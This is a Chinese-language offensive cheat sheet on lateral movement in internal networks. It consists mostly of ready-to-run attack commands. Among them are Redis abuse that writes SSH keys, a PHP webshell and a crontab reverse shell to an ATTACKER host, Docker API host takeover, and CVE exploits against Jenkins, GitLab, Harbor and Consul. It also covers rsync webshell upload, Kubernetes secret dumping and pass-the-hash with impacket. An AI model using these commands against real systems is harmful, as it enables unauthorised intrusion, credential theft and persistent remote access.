# 内网横移技术

> @TGSEC社区 · @TGSEC-Qtzuu 整理

## 一、内网信息收集

```bash
# 网络信息
ifconfig / ip addr
ip route
cat /etc/resolv.conf
arp -a
netstat -antp / ss -antp

# 存活主机探测
for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i UP"; done

# fscan(推荐)
./fscan -h 192.168.1.0/24 -p 1-65535 -o /tmp/fscan.txt

# nmap(通过proxychains)
proxychains nmap -sT -Pn -n 192.168.1.0/24 -p 22,80,443,3306,6379,8080,8443,27017,9200

# masscan
masscan 192.168.1.0/24 -p 1-10000 --rate 1000
```

## 二、SSH横移

```bash
# 密钥复用
ssh -i /home/user/.ssh/id_rsa user@192.168.1.100

# 已知密码批量横移
for host in $(cat hosts.txt); do
    sshpass -p 'password' ssh -o StrictHostKeyChecking=no root@$host "id; hostname" 2>/dev/null && echo "=== $host OK ==="
done

# SSH Agent转发(利用跳板机的agent)
ssh -A user@jumphost  # 开启agent转发
ssh user@internal     # 在jumphost上利用转发的密钥
```

## 三、常见未授权服务利用

### Redis未授权
```bash
redis-cli -h 192.168.1.100
# 写SSH公钥
redis-cli -h TARGET flushall
cat /tmp/key.txt | redis-cli -h TARGET -x set crackit
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save

# 写Webshell
redis-cli -h TARGET config set dir /var/www/html
redis-cli -h TARGET config set dbfilename shell.php
redis-cli -h TARGET set x '<?php system($_GET["cmd"]);?>'
redis-cli -h TARGET save

# 写Crontab
redis-cli -h TARGET config set dir /var/spool/cron
redis-cli -h TARGET config set dbfilename root
redis-cli -h TARGET set x '\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n'
redis-cli -h TARGET save
```

### MongoDB未授权
```bash
mongo --host 192.168.1.100
> show dbs
> use admin
> db.getUsers()
> use mydb
> db.getCollectionNames()
> db.users.find()
```

### Elasticsearch未授权
```bash
curl http://192.168.1.100:9200/
curl http://192.168.1.100:9200/_cat/indices
curl http://192.168.1.100:9200/_search?pretty
curl http://192.168.1.100:9200/_cat/nodes?v
```

### Memcached未授权
```bash
echo "stats" | nc 192.168.1.100 11211
echo "stats items" | nc 192.168.1.100 11211
echo "stats cachedump 1 100" | nc 192.168.1.100 11211
```

### Docker Remote API未授权
```bash
curl http://192.168.1.100:2375/version
curl http://192.168.1.100:2375/containers/json
# RCE
docker -H tcp://192.168.1.100:2375 run -v /:/mnt --rm -it alpine chroot /mnt bash
```

## 四、内网常见服务利用

### Jenkins
```bash
# 未授权访问Script Console
curl http://192.168.1.100:8080/script -d 'script=println("whoami".execute().text)'

# 已知漏洞
# CVE-2024-23897 任意文件读取
java -jar jenkins-cli.jar -s http://TARGET:8080 help "@/etc/passwd"
```

### GitLab
```bash
# CVE-2021-22205 RCE(文件上传)
python3 gitlab_rce.py http://192.168.1.100

# API Token利用
curl -H "PRIVATE-TOKEN: xxx" http://gitlab.internal/api/v4/projects
```

### Harbor(镜像仓库)
```bash
# CVE-2019-16097 未授权创建管理员
curl -X POST http://192.168.1.100/api/users -H "Content-Type: application/json" \
  -d '{"username":"admin2","password":"Harbor12345","email":"a@a.com","realname":"admin2","has_admin_role":true}'
```

### Zabbix
```bash
# 默认密码 Admin:zabbix
# 利用Script执行命令
# Monitoring → Latest data → 选择主机 → Execute command
```

### Consul
```bash
# 未授权API
curl http://192.168.1.100:8500/v1/agent/members
# RCE via service registration
curl -X PUT http://192.168.1.100:8500/v1/agent/service/register \
  -d '{"ID":"rce","Name":"rce","Address":"127.0.0.1","Port":80,"Check":{"Args":["bash","-c","id > /tmp/pwned"],"Interval":"10s"}}'
```

## 五、NFS/SMB/rsync横移

```bash
# NFS
showmount -e 192.168.1.100
mount -t nfs 192.168.1.100:/share /mnt

# SMB
smbclient -L //192.168.1.100 -N
smbclient //192.168.1.100/share -N
mount -t cifs //192.168.1.100/share /mnt -o guest

# rsync未授权
rsync 192.168.1.100::
rsync 192.168.1.100::share/
rsync -av 192.168.1.100::share/etc/passwd /tmp/
# 写入
rsync -av /tmp/shell.php 192.168.1.100::share/var/www/html/
```

## 六、容器逃逸后横移

```bash
# 逃逸到宿主机后
# 查找其他容器
docker ps -a
docker inspect <container_id> | grep -i "ip\|network\|mount"

# 进入其他容器
docker exec -it <container_id> /bin/bash

# 查看docker网络
docker network ls
docker network inspect bridge

# K8s环境
kubectl get pods --all-namespaces
kubectl exec -it <pod> -- /bin/bash
# 获取Secret
kubectl get secrets -o yaml
```

## 七、Pass the Hash/Key

```bash
# 如果拿到NTLM hash(Windows内网混合环境)
# pth-winexe
pth-winexe -U 'DOMAIN/admin%hash:hash' //192.168.1.100 cmd.exe

# impacket
python3 psexec.py -hashes :NTHASH admin@192.168.1.100
python3 wmiexec.py -hashes :NTHASH admin@192.168.1.100
python3 smbexec.py -hashes :NTHASH admin@192.168.1.100

# Kerberos票据
export KRB5CCNAME=/tmp/krb5cc_admin
python3 getTGT.py -hashes :NTHASH domain.com/admin
python3 psexec.py -k -no-pass admin@target.domain.com
```
